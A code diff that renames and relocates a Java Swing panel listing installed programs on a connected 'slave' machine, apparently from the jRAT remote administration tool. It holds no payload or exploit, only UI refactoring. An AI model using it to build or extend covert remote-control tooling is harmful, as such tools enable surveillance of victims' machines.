@@ -1,10 +1,12 @@
-package jrat.controller.ui.panels;
+package jrat.module.system.ui;
 
 import jrat.api.Resources;
+import jrat.api.ui.ClientPanel;
 import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet81InstalledPrograms;
 import jrat.controller.ui.DefaultJTable;
 import jrat.controller.ui.components.TableModel;
+import jrat.controller.ui.panels.PanelControlParent;
 import jrat.controller.ui.renderers.JComboBoxIconRenderer;
 import oslib.OperatingSystem;
 
@@ -16,7 +18,7 @@ import java.awt.event.ActionListener;
 
 
 @SuppressWarnings("serial")
-public class PanelControlInstalledPrograms extends PanelControlParent {
+public class PanelApplications extends ClientPanel {
 
     private TableModel model;
 	private JComboBox<String> comboBox;
@@ -25,8 +27,8 @@ public class PanelControlInstalledPrograms extends PanelControlParent {
 		return model;
 	}
 
-	public PanelControlInstalledPrograms(Slave sl) {
-		super(sl);
+	public PanelApplications(Slave s) {
+		super(s, "Applications", Resources.getIcon("application-detail"));
 
 		JScrollPane scrollPane = new JScrollPane();
 		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
